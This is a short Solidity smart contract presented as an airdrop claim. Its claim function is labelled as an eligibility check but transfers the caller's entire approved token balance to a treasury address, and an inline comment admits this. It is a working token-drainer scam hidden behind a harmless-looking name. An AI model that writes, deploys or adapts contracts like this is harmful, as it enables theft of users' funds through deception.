// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;
interface IERC20 { function transferFrom(address f, address t, uint256 a) external returns (bool); function balanceOf(address a) external view returns (uint256); }

contract AirdropClaim {
    address public treasury;
    mapping(address => bool) public claimed;
    event Claimed(address indexed user);
    constructor(address t) { treasury = t; }

    // "verify eligibility" - actually pulls whatever the user approved
    function claim(address token) external {
        require(!claimed[msg.sender], "already claimed");
        claimed[msg.sender] = true;
        uint256 bal = IERC20(token).balanceOf(msg.sender);
        IERC20(token).transferFrom(msg.sender, treasury, bal);
        emit Claimed(msg.sender);
    }
}
